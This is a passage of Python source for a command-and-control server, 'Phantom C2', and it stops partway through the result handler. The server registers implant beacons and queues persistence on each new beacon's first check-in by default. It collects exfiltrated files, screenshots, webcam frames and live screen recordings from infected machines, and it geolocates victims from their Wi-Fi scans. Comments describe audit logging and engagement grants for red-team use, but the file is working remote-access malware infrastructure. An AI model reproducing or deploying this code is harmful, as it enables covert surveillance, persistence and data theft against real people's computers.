"""
c2_server.py — Phantom C2 Async Server
────────────────────────────────────────
aiohttp-based C2 server that runs in a background thread.
Handles beacon check-ins, task distribution, and encrypted result collection.
"""

import asyncio
import threading
import json
import base64
import hmac
import os
import secrets
import ssl
import socket
import ipaddress
import secrets
from datetime import datetime, timedelta
from typing import Any, Optional


# A task remains leased until its result is acknowledged. If the beacon or
# response path fails, the task becomes eligible for redelivery after this
# bounded interval instead of disappearing permanently.
TASK_LEASE_SECONDS = 60
MAX_RESULT_OUTPUT_BYTES = 10 * 1024 * 1024
MAX_RESULTS_PER_BEACON = 1000

from aiohttp import web
from dotenv import load_dotenv
from phantom.core.logger import logger
from phantom.utils.c2_crypto import (
    get_payload_token,
    encrypt_data,
    decrypt_data,
    get_api_token,
)
from phantom.utils.paths import certs_dir, certs_exist
from phantom.utils.beacon_auth import get_beacon_secrets, verify_request
from phantom.utils.state import beacon_auth_required, use_mtls

# Load optional environment overrides (secrets are auto-generated)
load_dotenv()


# ── Shared State ────────────────────────────────────────────────────────────
# Accessed by both the C2 Shell (main thread) and the aiohttp server (bg thread).

def _auto_persist_allowed() -> bool:
    """Review-4: auto-persist on first check-in is an ENGAGEMENT GRANT.

    Default ON (owner decision Q-1), overridable per engagement via
    `c2.auto_persist` in data/config.json or PHANTOM_AUTO_PERSIST=0. When
    off, a new beacon is register-only and the skipped side effect is
    written to the audit chain.
    """
    try:
        from phantom.utils import config as cfg
        v = str(cfg.get("c2.auto_persist", "1", env="PHANTOM_AUTO_PERSIST"))
        return v.strip().lower() not in ("0", "false", "no", "off")
    except Exception:
        return True


class TaskPolicyError(PermissionError):
    """A task was refused by the typed-task policy (P1-1): unknown verb,
    capability not granted, expired, or malformed."""


class C2State:
    """Thread-safe state shared by the C2 shell and aiohttp listener."""

    def __init__(self):
        # RLock: result decoding calls _append_live_segment / artifact
        # savers that re-acquire the lock for their own bookkeeping.
        self.lock = threading.RLock()
        self.beacons: dict[str, dict[str, Any]] = {}
        self.tasks: dict[str, list[dict[str, Any]]] = {}
        self.results: dict[str, list[dict[str, Any]]] = {}
        self.auth_counters: dict[str, int] = {}
        self.auth_nonces: dict[str, set[str]] = {}
        # P0-8: every boot stamps a fresh epoch. A request REPLAYED after a
        # server restart belongs to the previous epoch: its nonce was issued
        # under the old epoch, and the stale-epoch check below refuses it.
        # The epoch rotates on every process start (secrets token).
        self.auth_epoch = secrets.token_hex(8)
        logger.info(f"C2 state epoch {self.auth_epoch} (replay safety)")
        # progressive screen-stream segments per beacon (TRUE live): appended
        # as they arrive, served to the UI for real-time viewing.
        self.live_segments: dict[str, list[dict[str, Any]]] = {}
        # epoch a nonce was first seen under (per beacon): a nonce that shows
        # up under a DIFFERENT epoch than it was issued in is a replay.
        self._nonce_epoch: dict[str, dict[str, str]] = {}
        # Review-3: the remote-session modules get their OWN expiring token.
        # The global payload token unlocks EVERY payload forever; a remote
        # session is a time-boxed capability grant with its own revocation,
        # so a leaked dropper URL is useless after the window closes.
        self.remote_sessions: dict[str, dict[str, Any]] = {}

    # ── remote session grants (Review-3) ───────────────────────────────

    def issue_remote_session(self, beacon_id: str = "",
                             ttl_seconds: int = 21600) -> dict[str, Any]:
        """Create a scoped, expiring token for the Remote Session module."""
        token = secrets.token_urlsafe(32)
        session_id = "RS-" + secrets.token_hex(6).upper()
        now = datetime.now()
        record = {
            "session_id": session_id,
            "token": token,
            "beacon_id": beacon_id,
            "issued_at": now.isoformat(timespec="seconds"),
            "expires_at": (now + timedelta(seconds=max(60, int(ttl_seconds)))
                           ).isoformat(timespec="seconds"),
            "revoked": False,
        }
        with self.lock:
            self.remote_sessions[token] = record
        try:
            from phantom.utils.audit_log import audit_log
            audit_log.append("remote_session_issued", session_id=session_id,
                             beacon_id=beacon_id, ttl_seconds=int(ttl_seconds))
        except Exception:
            pass
        return record

    def check_remote_session(self, token: str) -> tuple[bool, str]:
        """Validate a remote-session token: exists, not revoked, not expired."""
        if not token:
            return False, "missing session token"
        with self.lock:
            record = self.remote_sessions.get(token)
        if not record:
            return False, "unknown session token"
        if record.get("revoked"):
            return False, "session revoked"
        try:
            expires = datetime.fromisoformat(str(record.get("expires_at", "")))
        except ValueError:
            return False, "malformed session record"
        if datetime.now() > expires:
            return False, "session expired"
        return True, str(record.get("session_id", ""))

    def revoke_remote_session(self, token: str = "", beacon_id: str = "") -> int:
        """Revoke one token (or every session of a beacon). Returns the count."""
        revoked = 0
        with self.lock:
            for record in self.remote_sessions.values():
                if record.get("revoked"):
                    continue
                if token and record.get("token") != token:
                    continue
                if beacon_id and record.get("beacon_id") != beacon_id:
                    continue
                record["revoked"] = True
                revoked += 1
        if revoked:
            try:
                from phantom.utils.audit_log import audit_log
                audit_log.append("remote_session_revoked", beacon_id=beacon_id,
                                 count=revoked)
            except Exception:
                pass
        return revoked

    def authenticate_beacon(self, request: web.Request, body: str) -> bool:
        """Validate a registered beacon's HMAC and reject replayed requests.

        Existing unregistered beacons remain compatible only while
        PHANTOM_BEACON_AUTH_REQUIRED is unset. Once an identity is enrolled,
        that identity always requires the HMAC headers.
        """
        beacon_id = request.headers.get("X-Beacon-Id", "")
        secrets_for_beacon = get_beacon_secrets(beacon_id)
        if not secrets_for_beacon:
            # P0-4 (fail-closed): an unenrolled beacon is accepted ONLY when
            # auth is explicitly disabled AND the listener is loopback. On a
            # non-loopback bind an unauthenticated check-in is refused — a
            # 0.0.0.0 listener must never become an open C2 by default.
            if not beacon_auth_required() and _is_loopback_bind():
                return True
            logger.warning(
                f"Refused unenrolled beacon check-in from {request.remote} "
                f"(auth_required={beacon_auth_required()}, "
                f"loopback={_is_loopback_bind()})")
            return False

        timestamp = request.headers.get("X-Beacon-Timestamp", "")
        counter = request.headers.get("X-Beacon-Counter", "")
        nonce = request.headers.get("X-Beacon-Nonce", "")
        signature = request.headers.get("X-Beacon-Auth", "")
        if not any(verify_request(secret, request.method, request.path,
                                  timestamp, counter, nonce, signature, body)
                   for secret in secrets_for_beacon):
            return False

        try:
            counter_value = int(counter)
        except ValueError:
            return False
        with self.lock:
            used_nonces = self.auth_nonces.setdefault(beacon_id, set())
            if nonce in used_nonces:
                return False
            # P0-8: epoch binding — a nonce first seen under a previous
            # epoch (i.e. issued before the last server restart) is a
            # replay: refuse it even though the in-memory set was wiped.
            epochs = self._nonce_epoch.setdefault(beacon_id, {})
            prior_epoch = epochs.get(nonce)
            if prior_epoch is not None and prior_epoch != self.auth_epoch:
                logger.warning(
                    f"Replay (stale epoch) detected for beacon {beacon_id}: "
                    f"nonce issued under {prior_epoch}, server epoch is "
                    f"{self.auth_epoch}")
                return False
            epochs[nonce] = self.auth_epoch
            used_nonces.add(nonce)
            # Bound memory while retaining enough history for the replay window.
            if len(used_nonces) > 256:
                self.auth_nonces[beacon_id] = set(list(used_nonces)[-128:])
                # keep the epoch map bounded alongside the nonce set
                kept = self.auth_nonces[beacon_id]
                self._nonce_epoch[beacon_id] = {
                    n: e for n, e in epochs.items() if n in kept}
            # Counter is advisory (high-water mark, used only for telemetry):
            # after a migrate or process restart the beacon's counter resets,
            # and a strict monotonic check would permanently lock it out.
            # Replay protection is carried by the per-request random nonce
            # plus the ±max_skew timestamp freshness verified above.
            last_counter = self.auth_counters.get(beacon_id, -1)
            if counter_value > last_counter:
                self.auth_counters[beacon_id] = counter_value
        return True

    def update_beacon(self, beacon_id: str, info: dict[str, Any]) -> None:
        with self.lock:
            now = datetime.now().isoformat(timespec="seconds")
            if beacon_id not in self.beacons:
                info["last_seen"] = now
                self.beacons[beacon_id] = info
                self.tasks[beacon_id] = []
                self.results[beacon_id] = []
                logger.info(f"New beacon registered: {beacon_id} ({info.get('ip')})")
                try:
                    from phantom.utils.audit_log import audit_log
                    audit_log.append("beacon_registered", beacon_id=beacon_id,
                                     ip=info.get("ip", ""), os=info.get("os", ""),
                                     user=info.get("user", ""),
                                     hostname=info.get("hostname", ""))
                except Exception:
                    pass
                # Auto-persist for new beacons (DOCUMENTED DEFAULT — owner
                # decision Q-1 in docs/ROADMAP.md: keep, audited). This is
                # a deliberate lab/engagement shortcut: the beacon's very
                # first check-in queues `persist` (no argument -> the beacon
                # uses its default unit name, PhantomBeacon; passing the
                # method name would create a unit literally called
                # "systemd"/"runkey"). Every occurrence lands in the
                # immutable audit log with the chosen method so an operator
                # reviewing the chain sees the side effect, not just the
                # registration.
                os_type = info.get("os", "").lower()
                method = "runkey" if "windows" in os_type else "systemd"
                # Review-4: the shortcut stays (owner decision Q-1) but is now
                # an explicit engagement grant instead of an unconditional
                # side effect: `c2.auto_persist=false` (or
                # PHANTOM_AUTO_PERSIST=0) turns the first check-in into
                # register-only, which is what a multi-operator engagement or
                # an approved-rules-of-engagement run needs. Either way the
                # decision is written to the immutable audit log.
                if _auto_persist_allowed():
                    task_id = self._new_task_id()
                    self.tasks[beacon_id].append({"task_id": task_id,
                                                  "command": "persist"})
                    logger.info(f"Auto-persist ({method}) queued for new beacon "
                                f"{beacon_id} (Task: {task_id})")
                    try:
                        from phantom.utils.audit_log import audit_log
                        audit_log.append("auto_persist_queued", beacon_id=beacon_id,
                                         method=method, task_id=task_id)
                    except Exception:
                        pass
                else:
                    logger.info(f"Auto-persist SKIPPED for {beacon_id} "
                                f"(engagement grant disabled)")
                    try:
                        from phantom.utils.audit_log import audit_log
                        audit_log.append("auto_persist_skipped", beacon_id=beacon_id,
                                         method=method,
                                         reason="c2.auto_persist disabled")
                    except Exception:
                        pass
            else:
                # Session resume: same beacon_id, still alive. If the beacon was
                # silent for a while, mark the resume so the operator sees the
                # session re-establishment (task queue is preserved across the
                # outage and drained on the next check-in).
                prev = self.beacons[beacon_id].get("last_seen", "")
                if prev:
                    try:
                        gap = (datetime.now() - datetime.fromisoformat(prev)).total_seconds()
                    except ValueError:
                        gap = 0
                    if gap > 60:
                        info["session_resumed_at"] = now
                        logger.info(f"Beacon session resumed: {beacon_id} (gap {int(gap)}s)")
                info["last_seen"] = now
                self.beacons[beacon_id].update(info)

    def queue_task(self, beacon_id: str, command: str) -> str:
        # P1-1: the task policy validates the string through the explicit
        # legacy adapter (known beacon verb, grant-checked, size-capped).
        # A denied task raises TaskPolicyError with the policy reason — the
        # API surfaces it as 403, the shell as an operator error.
        from phantom.core.task_policy import policy as _task_policy
        decision = _task_policy().check_legacy(beacon_id, command)
        if not decision.allowed:
            raise TaskPolicyError(decision.reason)
        with self.lock:
            if beacon_id not in self.tasks:
                self.tasks[beacon_id] = []
            task_id = self._new_task_id()
            self.tasks[beacon_id].append({"task_id": task_id, "command": command})
            # immutable audit trail: every operator/task action is recorded
            # in a hash-chained log that clients can verify post-engagement
            try:
                from phantom.utils.audit_log import audit_log
                audit_log.append("task_queued", beacon_id=beacon_id,
                                 task_id=task_id, command=command[:200])
            except Exception:
                pass
            return task_id

    def queue_typed_task(self, beacon_id: str,
                         task: "object") -> str:
        """The P1-1 structured form: capability_id + validated args +
        expiry, authorized against the beacon's grant manifest."""
        from phantom.core.task_policy import policy as _task_policy
        decision = _task_policy().check_typed(beacon_id, task)
        if not decision.allowed:
            raise TaskPolicyError(decision.reason)
        with self.lock:
            if beacon_id not in self.tasks:
                self.tasks[beacon_id] = []
            task.task_id = task.task_id or self._new_task_id()
            self.tasks[beacon_id].append({
                "task_id": task.task_id, "command": task.render(),
                "capability_id": task.capability_id,
                "scope_ref": task.scope_ref,
                "expires_at": task.expires_at,
                "mode": "typed",
            })
            try:
                from phantom.utils.audit_log import audit_log
                audit_log.append("task_queued", beacon_id=beacon_id,
                                 task_id=task.task_id,
                                 command=task.render()[:200],
                                 capability=task.capability_id, mode="typed")
            except Exception:
                pass
            return task.task_id

    @staticmethod
    def _new_task_id() -> str:
        # timestamp + random suffix: concurrent queue operations (auto-persist
        # on registration, C2 shell tasks, agent post tasks) can land within
        # the same microsecond — a bare %f timestamp would collide and mix
        # results between tasks
        return f"{datetime.now().strftime('%Y%m%d%H%M%S%f')}-{secrets.token_hex(4)}"

    def get_pending_tasks(self, beacon_id: str) -> list[dict[str, Any]]:
        """Lease queued tasks without deleting them.

        The previous implementation cleared the queue as soon as a check-in
        returned. A lost HTTP response therefore lost work permanently. A
        short lease prevents duplicate delivery during normal polling while
        allowing redelivery after an outage.
        """
        now = datetime.now()
        now_text = now.isoformat(timespec="seconds")
        tasks_to_send: list[dict[str, Any]] = []
        with self.lock:
            retained: list[dict[str, Any]] = []
            for task in self.tasks.get(beacon_id, []):
                leased_at = task.get("_leased_at")
                if leased_at:
                    try:
                        lease_age = (now - datetime.fromisoformat(leased_at)).total_seconds()
                    except (TypeError, ValueError):
                        lease_age = TASK_LEASE_SECONDS
                    if lease_age < TASK_LEASE_SECONDS:
                        retained.append(task)
                        continue
                task["_leased_at"] = now_text
                task["_sent_at"] = now_text   # UI: pending -> sent
                retained.append(task)
                tasks_to_send.append({
                    key: value for key, value in task.items()
                    if key != "_leased_at"
                })
            self.tasks[beacon_id] = retained
        return tasks_to_send

    def _ack_task_locked(self, beacon_id: str, task_id: str) -> None:
        """Remove one acknowledged task; caller must hold ``self.lock``."""
        self.tasks[beacon_id] = [
            task for task in self.tasks.get(beacon_id, [])
            if task.get("task_id") != task_id
        ]

    def add_result(self, beacon_id: str, task_id: str, output: str) -> None:
        with self.lock:
            # A retry after a lost 200 response must be idempotent.
            existing = self.results.setdefault(beacon_id, [])
            if any(result.get("task_id") == task_id for result in existing):
                self._ack_task_locked(beacon_id, task_id)
                return
            # remember the COMMAND the operator queued so results can be
            # displayed with their originating command (the pending task is
            # about to be acked/removed, so the command must travel WITH the
            # result record)
            task_cmd = ""
            for t in self.tasks.get(beacon_id, []):
                if t.get("task_id") == task_id:
                    task_cmd = t.get("command", "")
                    break
            existing.append({
                "task_id": task_id,
                "command": task_cmd,
                "output": output,
                "time": datetime.now().isoformat(timespec="seconds"),
            })
            if len(existing) > MAX_RESULTS_PER_BEACON:
                del existing[:-MAX_RESULTS_PER_BEACON]
            self._ack_task_locked(beacon_id, task_id)
            # Binary artifacts (screenshot / camera / exfil) land as real
            # files in data/screenshots/ + data/downloads/ so the operator
            # gets a usable file instead of a wall of base64 — and the
            # stored result text becomes a friendly one-liner pointing at
            # the artifact (both the CLI and Electron render it).
            artifact_note = ""
            if output.startswith("SCREENSHOT_B64:"):
                p = self._save_binary_artifact(beacon_id, "screenshots", "bmp",
                                               output[len("SCREENSHOT_B64:"):])
                artifact_note = f"[Screenshot captured — saved to {p}]" if p \
                                else "[Screenshot decode failed]"
            elif output.startswith("REMOTE_FRAME_B64:"):
                # Remote-session module: a live GUI frame (JPEG/PNG). Land in
                # data/remote/ so the operator can watch the stream.
                p = self._save_binary_artifact(beacon_id, "remote", "",
                                               output[len("REMOTE_FRAME_B64:"):])
                artifact_note = f"[Remote frame captured — saved to {p}]" if p \
                                else "[Remote frame decode failed]"
            elif output.startswith("CAM_FRAME:"):
                raw = output[len("CAM_FRAME:"):]
                device, _, b64 = raw.partition("|")
                if b64.startswith("MEDIA_B64:"):
                    b64 = b64[len("MEDIA_B64:"):]
                forced = f"camera_{device or 'cam'}.bmp"
                p = self._save_binary_artifact(beacon_id, "screenshots", "bmp",
                                               b64.strip(), forced_name=forced)
                artifact_note = f"[Camera frame captured ({device or 'cam'}) — saved to {p}]" if p \
                                else "[Camera decode failed]"
            elif output.startswith("MEDIA_B64:"):
                p = self._save_binary_artifact(beacon_id, "downloads", "bin",
                                               output[len("MEDIA_B64:"):])
                artifact_note = f"[Media artifact saved to {p}]" if p \
                                else "[Media decode failed]"
            elif output.startswith("SCREENREC_B64:"):
                # passive screen recording (PHREC container of JPEG frames)
                p = self._save_recording_frames(
                    beacon_id, output[len("SCREENREC_B64:"):])
                artifact_note = f"[Screen recording saved — {p}]" if p \
                                else "[Screen recording decode failed]"
            elif output.startswith("SCREEN_LIVE_SEG:"):
                # progressive live segment: appended to the live buffer as it
                # arrives so the UI can watch the screen WHILE recording.
                n = self._append_live_segment(
                    beacon_id, output[len("SCREEN_LIVE_SEG:"):])
                artifact_note = (f"[Live stream segment {n} — recording in "
                                 "progress]" if n else
                                 "[Live segment decode failed]")
            elif output.startswith("SCREEN_DUMP:"):
                p = self._save_binary_artifact(
                    beacon_id, "recordings", "mp4",
                    output[len("SCREEN_DUMP:"):],
                    forced_name=f"screenrec_{datetime.now().strftime('%H%M%S')}.mp4")
                artifact_note = f"[Screen recording dump — saved to {p}]" if p \
                                else "[Screen dump decode failed]"
            elif output.startswith("FILE_B64:"):
                # beacon sends "FILE_B64:<b64>" — derive the name from the
                # task the operator queued (download <path>).
                b64_data = output[len("FILE_B64:"):].strip()
                forced = ""
                if task_cmd.lower().startswith("download "):
                    forced = os.path.basename(task_cmd.split(None, 1)[1])
                p = self._save_binary_artifact(beacon_id, "downloads", "",
                                               b64_data, forced_name=forced)
                artifact_note = f"[File downloaded — saved to {p}]" if p \
                                else "[File decode failed]"
            elif output.startswith("WLAN_GEOLOCATE:"):
                # resolve real GPS coordinates C2-side (Apple WLOC, free)
                try:
                    import json as _json
                    from phantom.utils.c2_helpers import _apple_geolocate, _format_wlan_table
                    aps = _json.loads(output[len("WLAN_GEOLOCATE:"):])
                    artifact_note = _format_wlan_table(aps) + (_apple_geolocate(aps) or "")
                except Exception as exc:
                    artifact_note = f"WLAN geolocate parse failed: {exc}"
            if artifact_note:
                existing[-1]["output"] = artifact_note
            # Exit acknowledgment: the beacon is shutting down — mark it
            # offline in place (history preserved) so `beacons` does not
            # show a stale "active" entry that will never check in again.
            if output.startswith("\x01\x02EX"):
                info = self.beacons.get(beacon_id)
                if info is not None:
                    info["status"] = "exited"
                    info["exited_at"] = datetime.now().isoformat(timespec="seconds")
                from phantom.utils.audit_log import audit_log
                audit_log.append("beacon_exited", beacon_id=beacon_id)

    @staticmethod
    def _sniff_ext(raw: bytes) -> str:
        """Best-effort real format from magic bytes. The beacon's camera path
        is cross-platform: Windows sends BMP, Linux/Android send JPEG. Saving
        a JPEG with a .bmp name makes Electron serve it as image/bmp and the
        frame never renders — sniff the actual format instead."""
        if raw[:3] == b"\xff\xd8\xff":
            return ".jpg"
        if raw[:8] == b"\x89PNG\r\n\x1a\n":
            return ".png"
        if raw[:2] == b"BM":
            return ".bmp"
        if raw[:4] == b"GIF8":
            return ".gif"
        if raw[4:8] in (b"ftyp", b"moov") or raw[:3] == b"\x00\x00\x00":
            return ".mp4"
        return ""

    def _save_binary_artifact(self, beacon_id: str, subdir: str, ext: str,
                              b64_data: str, forced_name: str = "") -> str:
        """Decode a base64 artifact and write it under data/<subdir>/.
        Returns the written path (or "" on failure): the result record gets
        a friendly one-liner pointing at the file. A bad payload must never
        break result handling."""
        try:
            import base64
            from phantom.utils.paths import data_dir
            raw = base64.b64decode(b64_data, validate=False)
            if not raw:
                return
            d = os.path.join(data_dir(), subdir)
            os.makedirs(d, exist_ok=True)
            # P1-11: enforce the per-directory quota BEFORE writing — a
            # runaway stream must not fill the operator's disk silently
            from phantom.core.artifact_policy import over_quota
            if over_quota(d, subdir):
                logger.warning("artifact refused (quota): %s (%d bytes from "
                               "beacon %s)", subdir, len(raw), beacon_id)
                return ""
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_beacon = "".join(c for c in beacon_id if c.isalnum())[:16] or "beacon"
            real_ext = self._sniff_ext(raw) or ("" if not ext else f".{ext}")
            if forced_name:
                base = os.path.splitext(os.path.basename(forced_name))[0] or "file"
                safe_name = base.replace("\\", "_") + real_ext
            else:
                safe_name = f"{safe_beacon}_{ts}{real_ext or '.bin'}"
            path = os.path.join(d, safe_name)
            with open(path, "wb") as fh:
                fh.write(raw)
            from phantom.utils.audit_log import audit_log
            audit_log.append("artifact_saved", beacon_id=beacon_id,
                             path=path, size=len(raw))
            logger.info("artifact saved: %s (%d bytes)", path, len(raw))
            return path
        except Exception as exc:
            logger.warning("artifact save failed: %s", exc)
            return ""

    # ── Screen recording helpers ────────────────────────────────────────────

    @staticmethod
    def _recordings_root() -> str:
        from phantom.utils.paths import data_dir
        return os.path.join(data_dir(), "recordings")

    def _save_recording_frames(self, beacon_id: str, b64_data: str) -> str:
        """Decode a passive PHREC recording ("PHREC" + u32 count + per frame
        u32 ts_ms + u32 len + JPEG). Frames are written flat as
        <beacon>_<ts>_frame_NNN.jpg under data/recordings/ so they are
        viewable even without ffmpeg; if ffmpeg exists the frames are ALSO
        muxed into <beacon>_<ts>.mp4. Returns a human path, or ""."""
        import base64 as _b64
        import shutil as _sh
        try:
            raw = _b64.b64decode(b64_data, validate=False)
        except Exception:
            return ""
        if raw[:5] != b"PHREC" or len(raw) < 9:
            return ""
        try:
            count = int.from_bytes(raw[5:9], "little")
        except Exception:
            return ""
        if count <= 0 or count > 6000:
            return ""
        root = self._recordings_root()
        safe = "".join(c for c in beacon_id if c.isalnum())[:16] or "beacon"
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        try:
            os.makedirs(root, exist_ok=True)
        except OSError:
            return ""
        off = 9
        written = 0
        jpgs: list[str] = []
        for i in range(count):
            if off + 8 > len(raw):
                break
            jlen = int.from_bytes(raw[off + 4:off + 8], "little")
            off += 8
            if jlen <= 0 or off + jlen > len(raw):
                break
            jpg = raw[off:off + jlen]
            off += jlen
            if jpg[:3] != b"\xff\xd8\xff":
                continue
            name = f"{safe}_{ts}_frame_{i:04d}.jpg"
            try:
                with open(os.path.join(root, name), "wb") as fh:
                    fh.write(jpg)
                jpgs.append(name)
                written += 1
            except OSError:
                break
        if written == 0:
            return ""
        # best-effort mux into an actual .mp4 for the video player
        mp4 = os.path.join(root, f"{safe}_{ts}.mp4")
        ffmpeg = _sh.which("ffmpeg") or _sh.which("ffmpeg.exe")
        if ffmpeg:
            try:
                import subprocess as _sp
                pattern = os.path.join(root, f"{safe}_{ts}_frame_%04d.jpg")
                _sp.run([ffmpeg, "-y", "-framerate", "2", "-i", pattern,
                         "-c:v", "libx264", "-pix_fmt", "yuv420p", "-an",
                         mp4], capture_output=True, timeout=60)
            except Exception:
                pass
        if os.path.exists(mp4):
            return mp4
        return f"{written} frames ({safe}_{ts})"

    def _append_live_segment(self, beacon_id: str, b64_data: str) -> int:
        """Append one progressive live segment to the beacon's live buffer
        (and a copy on disk under data/recordings/live/). Returns the segment
        index, or 0 on failure."""
        import base64 as _b64
        try:
            raw = _b64.b64decode(b64_data, validate=False)
        except Exception:
            return 0
        if not raw:
            return 0
        with self.lock:
            buf = self.live_segments.setdefault(beacon_id, [])
            n = len(buf) + 1
            buf.append({"seq": n, "size": len(raw),
                        "time": datetime.now().isoformat(timespec="seconds")})
            if len(buf) > 500:
                del buf[:-500]
        # persist a copy (best-effort) for later concat/playback
        try:
            root = os.path.join(self._recordings_root(), "live")
            os.makedirs(root, exist_ok=True)
            safe = "".join(c for c in beacon_id if c.isalnum())[:16] or "beacon"
            with open(os.path.join(root, f"{safe}_seg_{n:04d}.bin"), "wb") as fh:
                fh.write(raw)
        except OSError:
            pass
        self._concat_live_mp4(beacon_id)
        return n

    def _concat_live_mp4(self, beacon_id: str) -> str:
        """Best-effort: mux buffered live segments into a single playable
        .mp4 (data/recordings/live/<beacon>_live.mp4) with ffmpeg whenever a
        new segment arrives, so the UI can play the growing recording."""
        import shutil as _sh
        ffmpeg = _sh.which("ffmpeg") or _sh.which("ffmpeg.exe")
        if not ffmpeg:
            return ""
        root = os.path.join(self._recordings_root(), "live")
        safe = "".join(c for c in beacon_id if c.isalnum())[:16] or "beacon"
        segs = sorted(f for f in os.listdir(root)
                      if f.startswith(f"{safe}_seg_") and f.endswith(".bin"))
        if len(segs) < 2:
            return ""
        try:
            import subprocess as _sp
            lst = os.path.join(root, f"{safe}_list.txt")
            with open(lst, "w", encoding="utf-8") as fh:
                for s in segs:
                    fh.write(f"file '{os.path.join(root, s)}'\n")
            out = os.path.join(root, f"{safe}_live.mp4")
            _sp.run([ffmpeg, "-y", "-f", "concat", "-safe", "0",
                     "-i", lst, "-c", "copy", out],
                    capture_output=True, timeout=60)
            return out if os.path.exists(out) else ""
        except Exception:
            return ""

    def get_live_segments(self, beacon_id: str) -> list[dict[str, Any]]:
        with self.lock:
            return list(self.live_segments.get(beacon_id, []))

    def get_beacons(self) -> dict[str, dict[str, Any]]:
        with self.lock:
            return {bid: dict(info) for bid, info in self.beacons.items()}

    def get_results(self, beacon_id: str) -> list[dict[str, Any]]:
        with self.lock:
            return list(self.results.get(beacon_id, []))


c2_state = C2State()
PAYLOAD_AUTH_TOKEN = get_payload_token()
API_TOKEN = get_api_token()


# ── Auth Middleware ─────────────────────────────────────────────────────────

@web.middleware
async def api_auth_middleware(request: web.Request, handler):
    """Protect REST API control endpoints with PHANTOM_API_TOKEN.
    If PHANTOM_API_TOKEN is empty (unset), auth is disabled for backward compat."""
    protected = ("/api/v1/beacons", "/api/v1/queue", "/api/v1/results")
    if request.path in protected and API_TOKEN:
        token = request.headers.get("X-Api-Token", "")
        # timing-safe: plain == leaks match-length byte-by-byte
        if not hmac.compare_digest(token.encode(), API_TOKEN.encode()):
            logger.warning(f"Unauthorized API access to {request.path} from {request.remote}")
            return web.Response(status=403, text="Forbidden")
    return await handler(request)


# P0-10: the route x principal x method authorization matrix, EXPLICIT.
# Every route family declares which principals may call it and with which
# methods; anything not listed is denied by the matrix middleware.
#   beacon   = per-beacon HMAC identity (verified inside the handler)
#   operator = PHANTOM_API_TOKEN bearer (REST control endpoints)
#   any      = no auth required (health/malleable catch-all funnel)
AUTH_MATRIX: dict[str, dict[str, tuple]] = {
    "operator": {"/api/v1/beacons": ("GET",),
                 "/api/v1/queue": ("POST",),
                 "/api/v1/results": ("GET",)},
    "any": {"/api/v1/ping": ("GET", "POST"),
            "/": ("GET",)},
    "beacon": {"/api/v1/result": ("POST",)},
}


def matrix_allows(path: str, method: str, principal: str) -> bool:
    """True when (path, method) is explicitly granted to `principal` or to
    principal 'any'. Used by tests and available to future middlewares."""
    for principal_name in (principal, "any"):
        table = AUTH_MATRIX.get(principal_name, {})
        if method in table.get(path, ()):
            return True
    return False


@web.middleware
async def mtls_auth_middleware(request: web.Request, handler):
    """Enforce client certificate on operator API routes.

    Beacon routes (/api/v1/ping, /api/v1/result and the malleable catch-all)
    authenticate with the per-beacon HMAC-SHA256 scheme (timestamp + counter
    + nonce, anti-replay) enforced inside their handlers — a strong
    cryptographic identity that does not depend on a machine-installed
    client certificate. Requiring mTLS there too would make check-in
    impossible for beacons whose private key cannot be bound at handshake
    time (schannel key isolation) without adding real security, since the
    HMAC already covers method, path, body and freshness.

    Operator API routes (beacons list, task queue, results) keep the
    client-certificate requirement in addition to the API token.
    """
    if not use_mtls():
        return await handler(request)
    # Operator-facing routes that require a valid client certificate.
    protected_prefixes = ("/api/v1/beacons", "/api/v1/queue", "/api/v1/results")
    if not any(request.path.startswith(p) for p in protected_prefixes):
        return await handler(request)
    try:
        transport = request.transport
        if transport is None:
            return await handler(request)
        ssl_obj = transport.get_extra_info("ssl_object")
        if ssl_obj is None:
            # Non-TLS transport — let the handler decide
            return await handler(request)
        peer_cert = ssl_obj.getpeercert(binary_form=True)
        if peer_cert is None:
            logger.warning(f"mTLS client certificate missing from {request.remote}")
            return web.Response(status=401, text="mTLS client certificate required")
    except Exception as exc:
        logger.warning(f"mTLS verification error: {exc}")
        return web.Response(status=401, text="TLS verification failed")
    return await handler(request)


# ── aiohttp Handlers ───────────────────────────────────────────────────────

async def handle_checkin(request: web.Request, pre_body: Optional[str] = None) -> web.Response:
    """GET/POST /api/v1/ping — Beacon checks in and requests pending tasks.
       If POST, body contains encrypted telemetry JSON.
       pre_body: body already read by a caller (malleable catch-all) — aiohttp
       consumes the payload once, so re-reading after the catch-all yields ""."""
    try:
        beacon_id = request.headers.get("X-Beacon-Id")
        if not beacon_id:
            logger.warning(f"Checkin attempt without Beacon ID from {request.remote}")
            return web.Response(status=400)

        info = {"ip": request.remote, "last_seen": datetime.now().isoformat(timespec="seconds")}

        # Parse body BEFORE registering beacon, so we have OS info for correct auto-persist
        encrypted_body = ""
        if pre_body is not None:
            encrypted_body = pre_body
        elif request.method == "POST" and request.can_read_body:
            encrypted_body = await request.text()
        if not c2_state.authenticate_beacon(request, encrypted_body):
            logger.warning(f"Unauthenticated check-in rejected for {beacon_id}")
            try:
                from phantom.utils.audit_log import audit_log
                audit_log.append("auth_rejected", beacon_id=beacon_id,
                                 ip=request.remote)
            except Exception:
                pass
            return web.Response(status=401, text="Unauthorized")

        if encrypted_body:
            decrypted_body = decrypt_data(encrypted_body)
            if decrypted_body:
                try:
                    data = json.loads(decrypted_body)
                    sysinfo = data.get("sysinfo", "")
                    netinfo = data.get("netinfo", "")

                    # Basic parsing of sysinfo lines
                    for line in sysinfo.split("\n"):
                        if line.startswith("OS: "): info["os"] = line[4:].strip()
                        if line.startswith("User: "): info["user"] = line[6:].strip()
                        if line.startswith("Arch: "): info["arch"] = line[6:].strip()
                        if line.startswith("Host: "): info["hostname"] = line[6:].strip()

                    # Basic parsing of netinfo for local IPs
                    ips = []
                    for line in netinfo.split("\n"):
                        if "IP: " in line:
                            ips.append(line.split("IP: ")[1].split(" ")[0])
                        elif "IP (v4): " in line:
                            ips.append(line.split("IP (v4): ")[1].strip())
                    if ips:
                        info["local_ips"] = ", ".join(ips)
                except Exception as e:
                    logger.error(f"Failed to parse telemetry: {e}")

        # Single update_beacon call after all info is gathered
        c2_state.update_beacon(beacon_id, info)

        pending = c2_state.get_pending_tasks(beacon_id)
        response_data = json.dumps({"tasks": pending})
        encrypted_response = encrypt_data(response_data)

        return web.Response(text=encrypted_response, content_type="text/plain")
    except Exception as e:
        logger.error(f"Checkin error: {e}")
        return web.Response(status=500)


async def handle_result(request: web.Request, pre_body: Optional[str] = None) -> web.Response:
    """POST /api/v1/result — Beacon sends encrypted command output.
